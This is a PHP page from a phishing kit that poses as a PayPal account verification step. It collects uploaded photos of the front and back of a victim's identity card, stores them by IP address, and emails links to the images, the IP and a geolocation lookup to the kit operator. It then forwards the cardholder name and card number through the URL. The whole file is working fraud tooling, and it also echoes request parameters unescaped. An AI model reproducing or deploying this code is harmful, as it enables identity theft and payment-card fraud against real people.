<?php error_reporting(0); ?>
<?php
  ob_start();
  $ip_addresse = getenv('HTTP_CLIENT_IP')?:
  getenv('HTTP_X_FORWARDED_FOR')?:
  getenv('HTTP_X_FORWARDED')?:
  getenv('HTTP_FORWARDED_FOR')?:
  getenv('HTTP_FORWARDED')?:
  getenv('REMOTE_ADDR');
  $face = $_FILES['upload_idface']['tmp_name'];
  $back = $_FILES['upload_idback']['tmp_name'];
  $logrand = rand(0,1000);
  $facetype = pathinfo($face, PATHINFO_EXTENSION);
  $facedata = file_get_contents($face);
  $finalface = "id/" . $ip_addresse . "_face" . $logrand . ".jpg";
  $linkface = move_uploaded_file($face, $finalface);
  $backtype = pathinfo($back, PATHINFO_EXTENSION);
  $backdata = file_get_contents($back);
  $finalback = "id/" . $ip_addresse . "_back" . $logrand . ".jpg";
  $linkback = move_uploaded_file($back, $finalback);
  $serverlinkface = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]" . $finalface;
  $serverlinkfaces = str_replace("identity.php",$finalface, $serverlinkface);
  $serverlinkback = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]" . $finalback;
  $serverlinkbacks = str_replace("identity.php",$finalback, $serverlinkback);
  $subject = "ID Pictures - FROM ". $ip_addresse ."  -";
  $headers = "From: NARISSI \r\n";
  $headers .= "Reply-To: no-reply \r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
  $msg = "<div style='text-align: center; width: 400px'>";
  $msg .= "----------------------   ID    ------------------------- <br><br>";
  $msg .= "<b> Face Idendity Card : </b> <img src='" . $serverlinkfaces . "' width='400' height='250'> <b> Junk Press Here : <a href='$serverlinkfaces'>$serverlinkfaces</a></b> <br><br>";
  $msg .= "<b> Back Identity Card : </b> <img src='" . $serverlinkbacks . "' width='400' height='250'> <b> Junk Press Here : <a href='$serverlinkback'>$serverlinkbacks</a></b> <br><br>";
  $msg .= "<b> Ip Address : </b> <span style='color: #FC575E;'>$ip_addresse</span> <br><br>";
  $msg .= "<a href='https://geoiptool.com/fr/?ip=$ip_addresse' target='_blank'>https://geoiptool.com/fr/?ip=$ip_addresse</a><br><br>";
  $msg .= "------------------- Good Luck & Happy Shop <3 ------------------------- <br><br>";
  $msg .= "</div>";
  include '../../config.php';
  $to = $result_to;
  mail($to, $subject, $msg, $headers);
  header('Location: ../getstarted.php?holder=' . $_GET['holder'] . '&cc=' . $_GET['cc']);
?>
<!DOCTYPE html>
<html>
  <head>
    <head>
      <meta charset="utf-8">
      <title> Verify your Paypal Account Informations </title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="description" content="This Shell was created by Adnane Ar">
      <script src="../../js/ajax.js" charset="utf-8"></script>
      <script src="../../js/jquery.js" charset="utf-8"></script>
      <script src="../../js/jquery.min.js" charset="utf-8"></script>
      <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
      <link rel="stylesheet" href="../../css/styles.css">
      <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
      <link href="https://file.myfontastic.com/hSMyDca9BDwBA8GgvxRZRP/icons.css" rel="stylesheet">
    </head>
  </head>
  <body>
    <div class="bg"></div>
    <a href="./"><div class="logo"></div></a>
    <div class="panels bottom" id="former">
      <div class="profils">
        <div class="img">
          <img src="unknown.jpg" class="avatar">
        </div>
        <br>
        <div class="name holder"><?php echo $_GET['holder']; ?></div>
        <br>
        <br>
        <div class="name cc"><?php echo $_GET['cc']; ?></div>
      </div>
      <br>
      <div class="loader start" style="display: flex;" id="loader">
        <div class="load"></div>
      </div>
    </div>
    <script type="text/javascript">
      <?php include '../../js/js-plus.js'; ?>
    </script>
  </body>
</html>
